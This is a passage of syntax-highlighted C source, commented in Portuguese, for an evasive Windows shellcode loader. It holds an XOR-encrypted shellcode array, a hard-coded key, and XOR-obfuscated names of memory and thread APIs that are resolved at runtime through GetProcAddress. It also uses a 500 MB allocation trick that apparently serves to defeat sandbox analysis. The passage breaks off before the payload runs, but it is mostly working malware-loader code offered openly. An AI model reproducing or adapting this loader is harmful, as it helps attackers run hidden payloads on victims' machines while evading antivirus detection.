class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">};</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

<span class="kt">char</span> <span class="n">xor_key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"7h3L0s7C4rc0s4"</span><span class="p">;</span>

<span class="c1">//ponteiro para VirtualAlloc</span>
<span class="n">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pVA</span><span class="p">)(</span><span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>
<span class="c1">//ponteiro para VirtualProtect</span>
<span class="n">BOOL</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pVP</span><span class="p">)(</span><span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">DWORD</span>  <span class="n">flNewProtect</span><span class="p">,</span> <span class="n">PDWORD</span> <span class="n">lpflOldProtect</span><span class="p">);</span>
<span class="c1">//ponteiro para CreateThread</span>
<span class="n">HANDLE</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pCT</span><span class="p">)(</span><span class="n">PSECURITY_ATTRIBUTES</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">LPTHREAD_START_ROUTINE</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="n">__drv_aliasesMem</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="n">LPDWORD</span> <span class="n">lpThreadId</span><span class="p">);</span>
<span class="c1">//ponteiro para WaitForSingleObject</span>
<span class="n">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pWFSO</span><span class="p">)(</span><span class="n">HANDLE</span> <span class="n">hHandle</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwMilliseconds</span><span class="p">);</span>
<span class="c1">//ponteiro para RtlMoveMemory</span>
<span class="n">VOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pRM</span><span class="p">)(</span><span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> <span class="k">const</span> <span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Source</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">Length</span><span class="p">);</span>

<span class="c1">// XOR encrypted da VirtualAlloc</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cVA</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cVALen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cVA</span><span class="p">);</span>

<span class="c1">// XOR encrypted VirtualProtect</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cVP</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cVPLen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cVP</span><span class="p">);</span>

<span class="c1">//XOR encrypted da CreateThread</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cCT</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cCTLen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cCT</span><span class="p">);</span>

<span class="c1">//XOR encrypted da WaitForSingleObject</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cWFSO</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cWFSOLen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cWFSO</span><span class="p">);</span>

<span class="c1">//XOR encrypted da RtlMoveMemory</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cRM</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cRMLen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cRM</span><span class="p">);</span>

<span class="kt">void</span> <span class="nf">XOR</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
    <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="n">key_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">a</span><span class="p">];</span>
        <span class="n">a</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">rx</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="kr">thread</span><span class="p">;</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">mem</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">500000000</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">mem</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="mo">00</span><span class="p">,</span> <span class="mi">500000000</span><span class="p">);</span>
        <span class="n">free</span><span class="p">(</span><span class="n">mem</span><span class="p">);</span>

        <span class="c1">// deXOR da VirtualAlloc</span>
        <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">cVA</span><span class="p">,</span> <span class="n">cVALen</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>
            <span class="c1">// deXOR do shellcode</span>
        <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>
        <span class="c1">// deXOR da VirtualProtect</span>
        <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">cVP</span><span class="p">,</span> <span class="n">cVPLen</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>
        <span class="c1">// deXOR da CreateThread</span>
        <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">cCT</span><span class="p">,</span> <span class="n">cCTLen</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>
        <span class="c1">// deXOR da WaitForSingleObject</span>
        <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">cWFSO</span><span class="p">,</span> <span class="n">cWFSOLen</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>
        <span class="c1">// deXOR da RtlMoveMemory</span>
        <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">cRM</span><span class="p">,</span> <span class="n">cRMLen</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>

        <span class="n">pVA</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">cVA</span><span class="p">);</span>
        <span class="n">pVP</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">cVP</span><span class="p">);</span>
        <span class="n">pCT</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">cCT</span><span class="p">);</span>
        <span class="n">pWFSO</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">cWFSO</span><span class="p">);</span>
        <span class="n">pRM</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">cRM</span><span class="p">);</span>

